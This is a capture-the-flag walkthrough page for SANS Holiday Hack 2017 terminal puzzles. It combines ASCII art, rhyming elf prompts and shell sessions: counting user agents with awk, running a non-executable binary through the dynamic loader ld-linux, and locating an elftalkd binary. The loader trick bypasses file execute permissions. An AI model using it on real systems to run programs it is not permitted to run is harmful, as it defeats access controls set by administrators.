+/~~   \                .
+/ ° ~~  \         · .    
+/      ~~ \       ◆  ·    
+/     °   ~~\    ·     0
+/~~           \   .─··─ · o
+             /°  ~~  .*· · . \  ├──┼──┤                                        
+              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
+≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
+              │   /└───┘\┌───┐       ┌┐                                        
+                         └───┘    /▒▒▒▒                      ▒                 
+≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠=▒▒▒▒ ==≠==≠==≠==≠
+You did it! Thank you!</code></pre></div>
+
+<h3 id="minty-candycane">Minty Candycane</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                           ._    _.
+                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
+                            .\::/.                   \_\/  \/_/ 
+           .:.          _.=._\\//_.=._                  \\//
+      ..   \o/   ..      &#39;=&#39; //\\ &#39;=&#39;             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
+      :o|   |   |o:         &#39;/::\&#39;                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
+       ~ &#39;. &#39; .&#39; ~         (_)  (_)      _    _       _ //\\ _
+           &gt;O&lt;             &#39;      &#39;     /_/  \_\     / /\  /\ \
+       _ .&#39; . &#39;. _                        \\//       &lt;&gt; /  \ &lt;&gt;
+      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
+      &#39;&#39;   /o\   &#39;&#39;     &#39;.|  |.&#39;      \/ //&gt;&lt;\\ \/
+           &#39;:&#39;        . ~~\  /~~ .       _//\\_
+jgs                   _\_._\/_._/_      \_\  /_/ 
+                       / &#39; /\ &#39; \                   \o/
+       o              &#39; __/  \__ &#39;              _o/.:|:.\o_
+  o    :    o         &#39; .&#39;|  |&#39;.                  .\:|:/.
+    &#39;.\&#39;/.&#39;                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
+    :-&gt;@&lt;-:                 :                   _ &#39;/:|:\&#39; _
+    .&#39;/.\&#39;.           &#39;.___/*\___.&#39;              o\&#39;:|:&#39;/o 
+  o    :    o           \* \ / */                   /o\
+       o                 &gt;--X--&lt;
+                        /*_/ \_*\
+                      .&#39;   \*/   &#39;.
+                            :
+                            &#39;
+Minty Candycane here, I need your help straight away.
+We&#39;re having an argument about browser popularity stray.
+Use the supplied log file from our server in the North Pole.
+Identifying the least-popular browser is your noteworthy goal.
+total 28704
+-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
+-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
+elf@7b909dd6611c:~$ awk -F\&#34; &#39;{print $6}&#39; access.log | sort | uniq -c | sort -fr
+  27285 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
+...
+      1 Dillo/3.0.5
+      1 curl/7.35.0
+
+elf@7b909dd6611c:~$ ./runtoanswer 
+Starting up, please wait......
+Enter the name of the least popular browser in the web log: Dillo/3.0.5
+That is the least common browser in the web log! Congratulations!</code></pre></div>
+
+<h3 id="holly-evergreen">Holly Evergreen</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                     ___
+                    / __&#39;.     .-&#34;&#34;&#34;-.
+              .-&#34;&#34;-| |  &#39;.&#39;.  / .---. \
+             / .--. \ \___\ \/ /____| |
+            / /    \ `-.-;-(`_)_____.-&#39;._
+           ; ;      `.-&#34; &#34;-:_,(o:==..`-. &#39;.         .-&#34;-,
+           | |      /       \ /      `\ `. \       / .-. \
+           \ \     |         Y    __...\  \ \     / /   \/
+     /\     | |    | .--&#34;&#34;--.| .-&#39;      \  &#39;.`---&#39; /
+     \ \   / /     |`        \&#39;   _...--.;   &#39;---&#39;`
+      \ &#39;-&#39; / jgs  /_..---.._ \ .&#39;\\_     `.
+       `--&#39;`      .&#39;    (_)  `&#39;/   (_)     /
+                  `._       _.&#39;|         .&#39;
+                     ```````    &#39;-...--&#39;`
+My name is Holly Evergreen, and I have a conundrum.
+I broke the candy cane striper, and I&#39;m near throwing a tantrum.
+Assembly lines have stopped since the elves can&#39;t get their candy cane fix.
+We hope you can start the striper once again, with your vast bag of tricks.
+Run the CandyCaneStriper executable to complete this challenge.
+elf@9d94c6300de0:~$
+elf@9d94c6300de0:~$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper 
+                   _..._
+                 .&#39;\\ //`,      
+                /\\.&#39;``&#39;.=&#34;,
+               / \/     ;==|
+              /\\/    .&#39;\`,`
+             / \/     `&#34;&#34;`
+            /\\/
+           /\\/
+          /\ /
+         /\\/
+        /`\/
+        \\/
+         `
+The candy cane striping machine is up and running!
+elf@9d94c6300de0:~$ </code></pre></div>
+
+<h3 id="bushy-evergreen">Bushy Evergreen</h3>
+
+<div class="highlight"><pre class="chroma"><code class="language-none" data-lang="none">                                 |
+                               \ &#39; /
+                             -- (*) --
+                                &gt;*&lt;
+                               &gt;0&lt;@&lt;
+                              &gt;&gt;&gt;@&lt;&lt;*
+                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
+                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
+                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
+                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
+                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
+           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
+       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
+       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
+       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
+       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
+       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
+       &#34;&#34;&#34;&#34;|&#39;.&#39;.&#39;.|~~|.*.*.*|     ____|_
+           |&#39;.&#39;.&#39;.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
+           ~~~~~~~~         &#39;&#34;&#34;&#34;&#34;`------&#39;
+My name is Bushy Evergreen, and I have a problem for you.
+I think a server got owned, and I can only offer a clue.
+We use the system for chat, to keep toy production running.
+Can you help us recover from the server connection shunning?
+Find and run the elftalkd binary to complete this challenge.
+elf@9c19b504d83c:~$ 
+elf@9c19b504d83c:~$ ls -d -1 /**/* | grep -i elftalk
+/run/elftalk
+elf@9c19b504d83c:~$ ls /run/elftalk/bin/elftalkd 
+/run/elftalk/bin/elftalkd
+elf@9c19b504d83c:~$ /run/elftalk/bin/elftalkd </code></pre></div>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+    
+      
+        &nbsp;<li class="next"><a href="http://localhost:1313/blog/2017/04/Vulnhub---Breach-3-boot2root-CTF-walkthrough/"> Vulnhub - Breach 3 boot2root CTF walkthrough</a></li>
+      
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
+
+  
+  
+
+  <script type="text/javascript" src="http://localhost:1313//js/jquery-2.1.4.js"></script>
+
+  <script src="http://localhost:1313//js/bootstrap.min.js"></script>
+  <script src="http://localhost:1313//js/bootstrap.js"></script>
+  <script type="text/javascript" src="http://localhost:1313//js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="http://localhost:1313//lightbox/js/lightbox.js"></script>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', "UA-83225898-1", 'auto');
+    ga('send', 'pageview');
+  </script>
+  
+
+  
+
+</footer>
+
+	<script data-no-instant>document.write('<script src="/livereload.js?port=1313&mindelay=10"></' + 'script>')</script></body>
+</html>
